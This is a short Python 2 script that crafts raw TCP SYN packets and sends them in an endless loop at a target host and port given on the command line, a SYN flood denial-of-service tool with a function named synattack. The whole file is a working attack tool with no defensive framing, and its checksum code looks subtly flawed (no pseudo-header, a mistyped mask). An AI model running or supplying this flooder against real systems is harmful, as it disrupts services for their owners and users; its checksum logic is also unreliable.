#!/usr/bin/env python
# coding=utf-8
# Author: rickchen(at)gmail.com

import sys
import socket
import random
import struct


def checksum(source_string):
    rsum = 0

    count_to = (len(source_string)) / 2
    count = 0
    while count < count_to:
        val = ord(source_string[count + 1]) * 256 + ord(source_string[count])
        rsum = rsum + val
        rsum = rsum & 0xffffffff
        count += 2

    if count_to < len(source_string):
        rsum = rsum + ord(source_string[len(source_string) - 1])
        rsum = rsum & 0xfffffff

    rsum = (rsum >> 16) + (rsum & 0xffff)
    rsum = rsum + (rsum >> 16)

    answer = ~rsum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)

    return answer


def packdata(target_port, src_port=None):
    if src_port is None:
        src_port = random.randrange(1024, 65535)
    else:
        src_port = int(src_port)

    dst_port = int(target_port)
    seq_number = 1000  # squence number
    ack_number = 0  # acknowledgment number
    data_offset = 5  # 20 bytes TCP header
    reversed_flag = 0

    # # 6 bit Flag setup
    urg_flag = 0
    ack_flag = 0
    psh_flag = 0
    rst_flag = 0
    syn_flag = 1  # SYN = 1
    fin_flag = 0
    tcp_flags = fin_flag + (syn_flag << 1) + (rst_flag << 2) + (psh_flag << 3) + (ack_flag << 4) + (urg_flag << 5)

    window_size = 65535
    header_checksum = 0
    urg_pointer = 0

    tcp_header = struct.pack('!HHIIBBHHH', src_port, dst_port, seq_number,
                             ack_number, data_offset << 4, tcp_flags,
                             window_size, header_checksum, urg_pointer)
    header_checksum = checksum(tcp_header)
    tcp_header = struct.pack('!HHIIBBHHH', src_port, dst_port, seq_number,
                             ack_number, data_offset << 4, tcp_flags,
                             window_size, header_checksum, urg_pointer)

    tcp_syn_packet = tcp_header

    return tcp_syn_packet


def synattack(target_host, target_port, src_port=None):
    try:
        sockfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error:
        print 'Permiited error, can\'t create raw socket.'
        sys.exit(-1)

    syn_packet = packdata(target_port, src_port)
    dst_ip = socket.gethostbyname(target_host)
    sockfd.sendto(syn_packet, (dst_ip, 0))


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'Usage: %s <target> <port>' % (sys.argv[0])
        sys.exit(0)

    target = sys.argv[1]
    port = sys.argv[2]

    while True:
        try:
            synattack(target, port)
        except KeyboardInterrupt:
            sys.exit(0)